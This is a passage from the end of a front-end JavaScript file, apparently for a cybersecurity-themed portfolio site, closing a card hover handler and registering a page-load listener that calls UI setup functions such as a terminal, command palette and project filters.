    card.addEventListener('mouseenter', () => {
      card.style.transition = 'none';
    });
  });
}

/* ── DOM Initialization ── */
document.addEventListener('DOMContentLoaded', () => {
  setupCyberCanvas();
  setupTextScrambler();
  setupCardTilt();
  setupTerminal();
  setupSocInvestigator();
  setupProjectModal();
  setupSkillsFilter();
  setupCommandPalette();
  setupContactCopy();
  setupSpotlightEffect();
  setupScrollEngine();
  animateStats();
  setupProjectFilters();
  setupMobileMenu();
  renderProjectDetailPage();
  setupRevealObserver();
});
